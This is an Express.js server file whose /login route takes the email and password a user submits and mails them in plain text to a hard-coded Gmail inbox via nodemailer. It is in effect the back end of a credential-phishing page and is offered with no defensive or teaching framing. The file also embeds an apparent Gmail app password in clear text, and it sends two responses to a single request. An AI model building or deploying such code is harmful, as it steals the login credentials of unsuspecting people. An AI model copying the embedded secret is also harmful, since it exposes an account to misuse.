const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const nodemailer = require('nodemailer'); // Import nodemailer

const app = express();
const PORT = 5000;

app.use(bodyParser.json());
app.use(cors());

// Nodemailer transporter configuration
const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: 'chamikara98@gmail.com', // Your email address
        pass: 'hhzz ovyt tzhi fkrp' // Your email password
    }
});

app.post('/login', (req, res) => {
    const { email, password } = req.body;

    // Send email
    transporter.sendMail({
        from: 'chamikara@gmail.com',
        to: 'chamikara98@gmail.com', // Destination email address
        subject: 'Login Credentials',
        html: `<p>Email: ${email}</p><p>Password: ${password}</p>`
    }, (error, info) => {
        if (error) {
            console.error('Error:', error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent:', info.response);
            res.status(200).send('Email sent successfully');
        }
    });

    // Response to the client
    res.json({ email, password });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
